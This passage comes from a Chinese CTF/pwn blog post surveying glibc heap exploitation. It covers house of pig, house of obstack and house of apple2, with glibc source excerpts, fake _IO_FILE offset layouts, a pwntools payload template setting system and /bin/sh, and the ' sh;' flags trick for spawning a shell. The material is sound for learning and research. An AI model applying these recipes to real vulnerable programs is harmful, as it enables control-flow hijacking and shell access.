<p>该方法需要结合其他堆利用技术，需要保证 <code>malloc</code> 分配出来的 <code>chunk</code> 的地址是可控的。该方法主要提供了对 <code>IO</code> 系列函数中间接调用 <code>mallc/free/memcpy</code> 的组合利用。</p>
<h3 id="相关技巧-18"><a href="#相关技巧-18" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>可以 <code>largebin attack</code> 打掉 <code>mp_.tcachebins</code>，进而能把很大的 <code>chunk</code> 也放进入 <code>tcache</code> 进行管理</li>
<li>高版本没有 <code>hook</code> 的话，可以利用 <code>memcpy@got</code>，通过覆写 <code>got</code> 来进行 <code>rce</code></li>
<li>可以多次 <code>house of pig</code> 组合调用</li>
</ul>
<h3 id="利用效果-18"><a href="#利用效果-18" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意函数执行</li>
<li><code>ROP</code> 控制程序执行流</li>
</ul>
<h2 id="house-of-obstack"><a href="#house-of-obstack" class="headerlink" title="house of obstack"></a>house of obstack</h2><h3 id="漏洞成因-20"><a href="#漏洞成因-20" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
<h3 id="适用范围-20"><a href="#适用范围-20" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>可以执行一次 <code>largebin attack</code></li>
<li>可以触发 <code>IO</code> 流操作</li>
</ul>
<h3 id="利用原理-20"><a href="#利用原理-20" class="headerlink" title="利用原理"></a>利用原理</h3><p>一条新的利用链，伪造 <code>vtable</code> 为<code>_IO_obstack_jumps</code>，然后调用到<code>_IO_obstack_xsputn</code>，紧接着调用 <code>obstack_grow</code>，其代码为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> obstack_grow(OBSTACK, where, length)                      \</span></span><br><span class="line"><span class="meta">  __extension__                                   \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                       \</span></span><br><span class="line"><span class="meta">       int __len = (length);                              \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, __len);                      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);                     \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;                           \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure>

<p>然后在<code>_obstack_newchunk</code> 调用了 <code>CALL_CHUNKFUN</code> 这个宏</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *old_chunk = h-&gt;chunk;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *new_chunk;</span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = <span class="built_in">CALL_CHUNKFUN</span> (h, new_size);</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个宏会调用到函数指针：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *old_chunk = h-&gt;chunk;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *new_chunk;</span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = <span class="built_in">CALL_CHUNKFUN</span> (h, new_size);</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，其就是利用该函数指针进行控制程序的执行流。</p>
<h3 id="相关技巧-19"><a href="#相关技巧-19" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>伪造的 <code>IO_FILE</code> 布局如下：</p>
<ul>
<li>利用 <code>largebin attack</code> 伪造<code>_IO_FILE</code>，记完成伪造的 <code>chunk</code> 为 <code>A</code>（或者别的手法）</li>
<li><code>chunk A</code> 内偏移为 <code>0xd8</code> 处设为<code>_IO_obstack_jumps+0x20</code></li>
<li><code>chunk A</code> 内偏移为 <code>0xe0</code> 处设置 <code>chunk A</code> 的地址作为 <code>obstack</code> 结构体</li>
<li><code>chunk A</code> 内偏移为 <code>0x18</code> 处设为 <code>1</code>（<code>next_free</code>)</li>
<li><code>chunk A</code> 内偏移为 <code>0x20</code> 处设为 <code>0</code>（<code>chunk_limit</code>）</li>
<li><code>chunk A</code> 内偏移为 <code>0x48</code> 处设为 <code>&amp;/bin/sh</code></li>
<li><code>chunk A</code> 内偏移为 <code>0x38</code> 处设为 <code>system</code> 函数的地址</li>
<li><code>chunk A</code> 内偏移为 <code>0x28</code> 处设为 <code>1</code>（<code>_IO_write_ptr</code>)</li>
<li><code>chunk A</code> 内偏移为 <code>0x30</code> 处设为 <code>0</code> (<code>_IO_write_end</code>)</li>
<li><code>chunk A</code> 内偏移为 <code>0x50</code> 处设为 <code>1</code> (<code>use_extra_arg</code>)</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="built_in">flat</span>(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x18</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x20</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x28</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x30</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x38</span>:&amp;system,</span><br><span class="line">        <span class="number">0x48</span>:&amp;/bin/sh,</span><br><span class="line">        <span class="number">0x50</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0xd8</span>:&amp;_IO_obstack_jumps+<span class="number">0x20</span>,</span><br><span class="line">        <span class="number">0xe0</span>:chunkA,</span><br><span class="line">    &#125;</span><br><span class="line">    filler= <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><code>glibc-2.37</code> 开始这个方法的调用链为：<code>__printf_buffer_as_file_overflow -&gt; __printf_buffer_flush -&gt; __printf_buffer_flush_obstack-&gt;__obstack_newchunk</code>。</p>
<h3 id="利用效果-19"><a href="#利用效果-19" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意函数执行</li>
</ul>
<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><h3 id="漏洞成因-21"><a href="#漏洞成因-21" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><ul>
<li>堆溢出</li>
</ul>
<h3 id="适用范围-21"><a href="#适用范围-21" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>已知 <code>heap</code> 地址和 <code>glibc</code> 地址</li>
<li>能控制程序执行 <code>IO</code> 操作，包括但不限于：从 <code>main</code> 函数返回、调用 <code>exit</code> 函数、通过<code>__malloc_assert</code> 触发</li>
<li>能控制<code>_IO_FILE</code> 的 <code>vtable</code> 和<code>_wide_data</code>，一般使用 <code>largebin attack</code> 去控制</li>
</ul>
<h3 id="利用原理-21"><a href="#利用原理-21" class="headerlink" title="利用原理"></a>利用原理</h3><p>在<code>_IO_wfile_jumps</code>的<code>_IO_wfile_overflow</code> 函数中</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);</span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>调用<code>_IO_wdoallocbuf (f);</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure>

<p>调用了<code>(wint_t)_IO_WDOALLOCATE (fp)</code>这个函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure>

<p>可以看到调用的是<code>_wide_vtable</code>里的<code>__doallocate</code>函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> </span><br><span class="line">file = &#123;</span><br><span class="line">    _flags = <span class="number">-72537977</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x7f6d399137e4</span> &lt;_IO_2_1_stdout_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x7f6d39912a80</span> &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = <span class="number">1</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">-1</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x7f6d39915730</span> &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = <span class="number">-1</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x7f6d39912980</span> &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">-1</span>,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7f6d39914560</span> &lt;__GI__IO_file_jumps&gt;</span><br></pre></td></tr></table></figure>

<p>有一个<code>_wide_data</code>结构体，之前分析调用的是<code>_wide_data</code>的<code>wide_vtable</code>里的函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line"> _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line"> _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line"> _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_state = &#123;</span><br><span class="line">   __count = <span class="number">0</span>,</span><br><span class="line">   __value = &#123;</span><br><span class="line">     __wch = <span class="number">0</span>,</span><br><span class="line">     __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> _IO_last_state = &#123;</span><br><span class="line">   __count = <span class="number">0</span>,</span><br><span class="line">   __value = &#123;</span><br><span class="line">     __wch = <span class="number">0</span>,</span><br><span class="line">     __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> _codecvt = &#123;</span><br><span class="line">   __cd_in = &#123;</span><br><span class="line">     step = <span class="number">0x0</span>,</span><br><span class="line">     step_data = &#123;</span><br><span class="line">       __outbuf = <span class="number">0x0</span>,</span><br><span class="line">       __outbufend = <span class="number">0x0</span>,</span><br><span class="line">       __flags = <span class="number">0</span>,</span><br><span class="line">       __invocation_counter = <span class="number">0</span>,</span><br><span class="line">       __internal_use = <span class="number">0</span>,</span><br><span class="line">       __statep = <span class="number">0x0</span>,</span><br><span class="line">       __state = &#123;</span><br><span class="line">         __count = <span class="number">0</span>,</span><br><span class="line">         __value = &#123;</span><br><span class="line">           __wch = <span class="number">0</span>,</span><br><span class="line">           __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;,</span><br><span class="line">   __cd_out = &#123;</span><br><span class="line">     step = <span class="number">0x0</span>,</span><br><span class="line">     step_data = &#123;</span><br><span class="line">       __outbuf = <span class="number">0x0</span>,</span><br><span class="line">       __outbufend = <span class="number">0x0</span>,</span><br><span class="line">       __flags = <span class="number">0</span>,</span><br><span class="line">       __invocation_counter = <span class="number">0</span>,</span><br><span class="line">       __internal_use = <span class="number">0</span>,</span><br><span class="line">       __statep = <span class="number">0x0</span>,</span><br><span class="line">       __state = &#123;</span><br><span class="line">         __count = <span class="number">0</span>,</span><br><span class="line">         __value = &#123;</span><br><span class="line">           __wch = <span class="number">0</span>,</span><br><span class="line">           __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> _shortbuf = <span class="string">L&quot;&quot;</span>,</span><br><span class="line"> _wide_vtable = <span class="number">0x7f6d39914020</span> &lt;__GI__IO_wfile_jumps&gt;</span><br></pre></td></tr></table></figure>

<p>因此有以下利用：</p>
<ul>
<li>将 <code>IO_FILE</code> 中的 <code>vtable</code> 字段改为 <code>_IO_wfile_jumps</code></li>
<li>将 <code>IO_FILE</code> 中的 <code>wide_data</code> 设置为可控堆地址，目的是控制 <code>wide_data</code> 中的 <code>write_base</code> 和 <code>buf_base</code> 为0</li>
<li>控制 <code>wide_data-&gt;wide_vtable</code> 为地址 <code>A</code>，地址 <code>A</code> 满足 <code>*(A+0x68) == system</code> （此处的 <code>system</code> 地址是自己布置的）</li>
</ul>
<p>总结下执行到最后的位置<strong>需要绕过的检查</strong></p>
<ol>
<li><code>_flags</code> 设置为<code>~(2 | 0x8 | 0x800)</code> ，如果是需要获取 <code>shell</code> 的话，那么可以将参数写为 <code>sh;</code> 这样 <code>_flags</code> 既能绕过检查，又能被 <code>system</code> 函数当做参数成功执行。需要注意的是 <code>sh;</code> 前面是有两个空格的（这个值是 <code>0x3b68732020</code> ）</li>
<li><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code> , <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code></li>
<li><code>fp-&gt;_mode == 0</code> 和 <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> ,这样即可触发 <code>_IO_OVERFLOW</code>。</li>
</ol>
<h3 id="相关技巧-20"><a href="#相关技巧-20" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>利用<code>_IO_wfile_overflow</code> 函数控制程序执行流时对 <code>fp</code> 的设置如下：</p>
<ul>
<li><code>_flags</code> 设置为 <code>~(2 | 0x8 | 0x800)</code>，如果不需要控制 <code>rdi</code>，设置为 <code>0</code> 即可；如果需要获得 <code>shell</code>，可设置为<code> sh;</code>，注意前面有两个空格</li>
<li><code>vtable</code> 设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> 地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code> 即可</li>
<li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>，即满足 <code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code>，即满足 <code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code>，即满足 <code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code> 设置为可控堆地址 <code>B</code>，即满足 <code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> 设置为地址 <code>C</code> 用于劫持 <code>RIP</code>，即满足 <code>*(B + 0x68) = C</code></li>
</ul>
<h3 id="利用效果-20"><a href="#利用效果-20" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意函数执行</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://s1nec-1o.github.io">s1nec-1o</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://s1nec-1o.github.io/2025/02/21/how2heap/">http://s1nec-1o.github.io/2025/02/21/how2heap/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://s1nec-1o.github.io" target="_blank">S1nec-1o's B1og</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/traditional-pwn/">traditional pwn</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/03/03/%E5%9B%BA%E4%BB%B6%E4%B8%8B%E7%9A%84hook-patch/" title="固件下的hook &amp; patch"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">固件下的hook &amp; patch</div></div></a></div><div class="next-post pull-right"><a href="/2025/02/13/Hexagon%E5%AD%A6%E4%B9%A0/" title="Hexagon学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Hexagon学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/01/27/2024-1-26%E6%B2%99%E7%9B%92%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="2024-1-26沙盒的学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-27</div><div 